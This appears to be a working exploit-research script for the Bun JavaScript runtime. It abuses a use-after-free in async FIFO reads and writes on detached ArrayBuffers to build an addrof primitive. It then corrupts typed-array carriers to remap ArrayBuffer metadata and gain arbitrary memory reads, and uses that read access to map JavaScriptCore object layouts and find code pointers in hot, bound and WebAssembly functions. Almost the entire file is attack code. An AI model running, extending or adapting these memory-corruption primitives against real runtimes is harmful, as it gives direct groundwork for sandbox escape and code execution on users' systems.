// No-FFI layout census using the addrof -> ArrayBuffer metadata native view.
//
// Goal: look for control-flow-adjacent pointers in JSC objects without FFI,
// symbol lookup, or native helper dylibs. This is a read-only census over
// known-valid addresses obtained with addrof(target).

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const readBytes = Number(process.env.READ_BYTES || 32);
const secondReadBytes = Number(process.env.SECOND_READ_BYTES || 64);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const recurseHeap = process.env.RECURSE_HEAP === "1";
const maxRecursiveReads = Number(process.env.MAX_RECURSIVE_READS || 16);
const targetFilter = process.env.TARGET_FILTER ? new RegExp(process.env.TARGET_FILTER) : null;
const retainedBridgeCarriers = [];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-noffi-layout-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(error) {
  return error?.code === "EAGAIN" || error?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (error) {
      if (isAgain(error)) break;
      throw error;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (error) {
      if (!isAgain(error)) throw error;
    }
    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LEBytes(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function readU64LE(view, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(view[offset + i]);
  return value;
}

function writeU64LE(view, offset, value) {
  let v = value;
  for (let i = 0; i < 8; i++) {
    view[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function classifyPointer(value) {
  if ((value >> 48n) !== 0n || (value & 0x7n) !== 0n) return null;
  if (value >= 0x0000000100000000n && value < 0x0000008000000000n) return "low-code-or-image";
  if (value >= 0x0000600000000000n && value < 0x0000640000000000n) return "asan-heap";
  if (value >= 0x0000100000000000n && value < 0x0000800000000000n) return "canonical-high";
  return null;
}

function isLikelyReadableHeap(value) {
  return classifyPointer(value) === "asan-heap";
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof-leak");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

function makeBridgeCarrier(index) {
  const fill = (0x71 + (index & 15)) & 0xff;
  const view = new Uint8Array(new ArrayBuffer(viewSize));
  view.fill(fill);
  return view;
}

function freshCarrierBytes(carrier) {
  return new Uint8Array(carrier.buffer);
}

function allocateBridgeCarriers() {
  const retained = [];
  for (let i = 0; i < sprayCount; i++) retained.push(makeBridgeCarrier(i));
  return retained;
}

async function corruptBridgeToAddress(address) {
  const path = join(tmpdir(), `bun-noffi-layout-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const bridgeCarriers = allocateBridgeCarriers();
    gcNow();
    fs.writeSync(fd, payloadU64(address), 0, 8);
    const result = await done;
    return { bridgeCarriers, bytesRead: result.bytesRead, err: result.err?.message };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findRemappedBridge(bridgeCarriers, requireLengthFields = false) {
  for (let i = 0; i < bridgeCarriers.length; i++) {
    try {
      const fresh = freshCarrierBytes(bridgeCarriers[i]);
      const expected = (0x71 + (i & 15)) & 0xff;
      if (fresh[0] === expected) continue;
      const dataPtr = readU64LE(fresh, 16);
      const byteLength = readU64LE(fresh, 48);
      const maxByteLength = readU64LE(fresh, 56);
      const lengthOk = byteLength === BigInt(viewSize) && maxByteLength === BigInt(viewSize);
      if (classifyPointer(dataPtr) && (!requireLengthFields || lengthOk)) {
        return { index: i, fresh, dataPtr, byteLength, maxByteLength };
      }
    } catch {}
  }
  return null;
}

async function buildNativeView() {
  const victimBuffer = new ArrayBuffer(viewSize);
  const victimView = new Uint8Array(victimBuffer);
  victimView.fill(0xa5);
  const victimAddress = await addrof(victimBuffer);

  let wrapperBridge;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(victimAddress);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    wrapperBridge = findRemappedBridge(result.bridgeCarriers, false);
    if (wrapperBridge) break;
  }
  if (!wrapperBridge) throw new Error("failed to map ArrayBuffer wrapper");

  let metadataBridge;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(wrapperBridge.dataPtr);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    metadataBridge = findRemappedBridge(result.bridgeCarriers, true);
    if (metadataBridge) break;
  }
  if (!metadataBridge) throw new Error("failed to map ArrayBuffer metadata");

  const originalDataPtr = metadataBridge.dataPtr;
  return { victimBuffer, metadataView: metadataBridge.fresh, originalDataPtr, victimAddress, wrapperAddress: wrapperBridge.dataPtr };
}

function wordsFromBytes(bytes) {
  const words = [];
  for (let offset = 0; offset + 8 <= bytes.length; offset += 8) {
    const value = readU64LEBytes(bytes, offset);
    const cls = classifyPointer(value);
    words.push({ offset, value: hex(value), class: cls });
  }
  return words;
}

function makeTargets() {
  function coldFunction(a) { return a + 1; }
  function hotFunction(a) { return ((a + 1) | 0); }
  function hotStore(arr, value) { arr[0] = value; return arr[0]; }
  const hotArray = [0];
  for (let i = 0; i < 120000; i++) {
    hotFunction(i);
    hotStore(hotArray, i);
  }

  let wasmFunction = null;
  try {
    const wasm = new Uint8Array([
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
      0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
      0x03, 0x02, 0x01, 0x00,
      0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00,
      0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
    ]);
    wasmFunction = new WebAssembly.Instance(new WebAssembly.Module(wasm)).exports.run;
    for (let i = 0; i < 1000; i++) wasmFunction();
  } catch {}

  const targets = [
    ["plain-object", { a: 13.37, b: "marker", c: hotArray }],
    ["array", [1.1, 2.2, 3.3, hotArray]],
    ["uint8array", new Uint8Array(128)],
    ["arraybuffer", new ArrayBuffer(128)],
    ["dataview", new DataView(new ArrayBuffer(128))],
    ["cold-function", coldFunction],
    ["hot-function", hotFunction],
    ["hot-store-function", hotStore],
    ["bound-function", hotFunction.bind(null, 7)],
    ["regexp", /layout-(\d+)/g],
    ["map", new Map([[{ k: 1 }, { v: 2 }]])],
    ["set", new Set([{ s: 1 }, { s: 2 }])],
    ["promise", Promise.resolve(123)],
  ];
  if (wasmFunction) targets.push(["wasm-function", wasmFunction]);
  return targets;
}

const native = await buildNativeView();

function readAddress(address, length = readBytes) {
  writeU64LE(native.metadataView, 16, address);
  const view = new Uint8Array(native.victimBuffer);
  return Buffer.from(view.subarray(0, Math.min(length, view.length)));
}

const results = [];
const recursive = [];
const seenRecursive = new Set();

for (const [label, target] of makeTargets()) {
  if (targetFilter && !targetFilter.test(label)) continue;
  const address = await addrof(target);
  const bytes = readAddress(address, readBytes);
  const words = wordsFromBytes(bytes);
  results.push({
    label,
    address: hex(address),
    prefix: [...bytes],
    words,
    pointers: words.filter(word => word.class),
  });

  if (recurseHeap) {
    for (const word of words) {
      const value = BigInt(word.value);
      if (!isLikelyReadableHeap(value) || seenRecursive.has(word.value)) continue;
      if (recursive.length >= maxRecursiveReads) break;
      seenRecursive.add(word.value);
      const nested = readAddress(value, secondReadBytes);
      recursive.push({
        from: label,
        fieldOffset: word.offset,
        address: word.value,
        prefix: [...nested],
        words: wordsFromBytes(nested),
      });
    }
  }
}

writeU64LE(native.metadataView, 16, native.originalDataPtr);

const output = JSON.stringify({
  final: true,
  harness: "noffi-native-view-layout-census",
  victimAddress: hex(native.victimAddress),
  wrapperAddress: hex(native.wrapperAddress),
  originalDataPtr: hex(native.originalDataPtr),
  readBytes,
  recurseHeap,
  results,
  recursive,
}, null, 2);

fs.writeSync(1, `${output}\n`);
process.reallyExit(results.length > 0 ? 86 : 1);
